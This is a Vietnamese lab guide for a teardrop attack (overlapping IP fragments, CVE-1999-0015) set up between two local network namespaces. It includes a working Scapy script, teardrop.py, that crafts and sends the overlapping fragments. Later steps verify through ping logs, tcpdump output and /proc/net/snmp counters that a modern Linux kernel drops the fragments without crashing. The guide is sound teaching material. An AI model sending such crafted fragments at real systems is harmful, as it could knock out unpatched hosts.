# HƯỚNG DẪN THỰC HÀNH: LAB 06
## Teardrop Attack (IP Fragmentation Overlap)

---

### 1. MỤC TIÊU & MÔ HÌNH MẠNG
- **Mục tiêu:** Mô phỏng kỹ thuật phân mảnh IP chồng lấn (Overlapping Fragments - CVE-1999-0015) bằng Scapy, gửi 2 mảnh có dải byte đè lên nhau (Mảnh 1: offset 0, dài 24 bytes; Mảnh 2: offset 8, dài 24 bytes $\implies$ chồng lấn 16 bytes). Chứng minh rằng Linux Kernel hiện đại kiểm tra biên an toàn, không bị crash, duy trì 100% sức sống mạng và ghi nhận lỗi vào biến đếm `/proc/net/snmp` (`ReasmFails`).
- **Topology:**
  - `h1`: `10.0.0.1/24` (Attacker) trên `veth1`
  - `h2`: `10.0.0.2/24` (Victim) trên `veth2`

---

### 2. BƯỚC 1: KHỞI TẠO THƯ MỤC VÀ TẠO CÁC SCRIPT

Tạo thư mục `/tmp/lab06` và tạo 2 script bằng `cat << 'EOF'` (hoặc dùng `nano <tên_file>` để soạn thảo):

```bash
mkdir -p /tmp/lab06 && cd /tmp/lab06

# 1. Script thiết lập mạng: setup_pair.sh
cat << 'EOF' > /tmp/lab06/setup_pair.sh
#!/usr/bin/env bash
set -e

echo "[*] Dọn dẹp namespace cũ..."
ip netns del h1 2>/dev/null || true
ip netns del h2 2>/dev/null || true

echo "[*] Tạo 2 namespace h1 (Attacker) và h2 (Victim)..."
ip netns add h1
ip netns add h2

echo "[*] Tạo veth pair nối h1 và h2..."
ip link add veth1 type veth peer name veth2
ip link set veth1 netns h1
ip link set veth2 netns h2

echo "[*] Cấu hình địa chỉ IP..."
ip netns exec h1 ip link set dev lo up
ip netns exec h1 ip addr add 10.0.0.1/24 dev veth1
ip netns exec h1 ip link set dev veth1 up

ip netns exec h2 ip link set dev lo up
ip netns exec h2 ip addr add 10.0.0.2/24 dev veth2
ip netns exec h2 ip link set dev veth2 up

echo "[+] Kiểm tra ping baseline giữa h1 và h2:"
ip netns exec h1 ping -c 2 10.0.0.2
echo "[+] Khởi tạo môi trường hoàn tất!"
EOF
chmod +x /tmp/lab06/setup_pair.sh

# 2. Script gửi mảnh phân đoạn chồng lấn: teardrop.py
cat << 'EOF' > /tmp/lab06/teardrop.py
#!/usr/bin/env python3
from scapy.all import IP, send

dst = "10.0.0.2"
ipid = 1234

print(f"[*] Chế tạo 2 mảnh IP Teardrop chồng lấn:")
# Mảnh 1: frag=0 (byte 0..23), MF=1 (More Fragments), payload 24 bytes chữ 'A'
f1 = IP(dst=dst, id=ipid, flags="MF", frag=0, proto=17) / (b"A" * 24)

# Mảnh 2: frag=1 (offset thực tế = 1 * 8 = byte 8..31), MF=0 (Mảnh cuối), payload 24 bytes chữ 'B'
# Chồng lấn 16 bytes (từ byte 8 đến byte 23)
f2 = IP(dst=dst, id=ipid, flags=0, frag=1, proto=17) / (b"B" * 24)

send([f1, f2], verbose=0)
print(f"[+] Đã gửi 2 mảnh Teardrop (ID={ipid}) tới {dst}!")
EOF
```

---

### 3. BƯỚC 2: CHẠY THIẾT LẬP MẠNG & GHI NHẬN BASELINE SNMP

1. Chạy setup:
   ```bash
   sudo bash /tmp/lab06/setup_pair.sh
   ```
2. Ghi nhận thống kê tái hợp mảnh IP trước khi gửi gói độc hại:
   ```bash
   sudo ip netns exec h2 sh -c "cat /proc/net/snmp | grep -A1 '^Ip:'"
   ```
   > **Lưu ý các cột:** `ReasmReqds = 0`, `ReasmOKs = 0`, `ReasmFails = 0`.

---

### 4. BƯỚC 3: PHÁT ĐỘNG TẤN CÔNG & GIÁM SÁT SỨC SỐNG

1. Mở `tcpdump` trên `h2` (`veth2`) để bắt các mảnh IP đến:
   ```bash
   sudo ip netns exec h2 tcpdump -i veth2 -nn -v ip > /tmp/lab06/tcpdump_frag.log 2>&1 &
   sleep 1
   ```
2. Mở một luồng ping kiểm tra sức sống liên tục từ `h2` về `h1` (gửi 10 gói, cách nhau 0.3s):
   ```bash
   sudo ip netns exec h2 ping -i 0.3 -c 10 10.0.0.1 > /tmp/lab06/ping_health.log 2>&1 &
   sleep 1
   ```
3. Phát động gửi các mảnh Teardrop từ `h1`:
   ```bash
   sudo ip netns exec h1 python3 /tmp/lab06/teardrop.py
   sleep 3
   ```

---

### 5. BƯỚC 4: KIỂM CHỨNG KẾT QUẢ

1. Kiểm tra log bắt gói `tcpdump`:
   ```bash
   cat /tmp/lab06/tcpdump_frag.log | grep "id 1234"
   ```
   *Kỳ vọng:*
   - Mảnh 1: `id 1234, offset 0, flags [+]` (MF=1).
   - Mảnh 2: `id 1234, offset 8, flags [none]` (MF=0).

2. Kiểm tra sức sống của nạn nhân:
   ```bash
   cat /tmp/lab06/ping_health.log | tail -n 3
   ```
   *Kỳ vọng:* `10 packets transmitted, 10 received, 0% packet loss` (Nạn nhân hoàn toàn khỏe mạnh, không bị treo hay crash).

3. Kiểm tra biến đếm SNMP sau tấn công:
   ```bash
   sudo ip netns exec h2 sh -c "cat /proc/net/snmp | grep -A1 '^Ip:'"
   ```
   *Kỳ vọng:*
   - `ReasmReqds`: Tăng lên **2** (nhận 2 mảnh cần ráp).
   - `ReasmOKs`: Giữ nguyên **0** (không ráp được gói hỏng).
   - `ReasmFails`: Tăng lên **1** (Kernel phát hiện chồng lấn bất thường và drop an toàn).

4. Kiểm tra nhật ký nhân Linux:
   ```bash
   dmesg | tail -n 10
   ```
   *Kỳ vọng:* Hoàn toàn sạch sẽ, không có thông báo Kernel Panic hay Oops.

---

### 6. BƯỚC 5: DỌN DẸP MÔI TRƯỜNG

```bash
sudo pkill -f tcpdump 2>/dev/null || true
sudo ip netns del h1 2>/dev/null || true
sudo ip netns del h2 2>/dev/null || true
sudo rm -rf /tmp/lab06
```
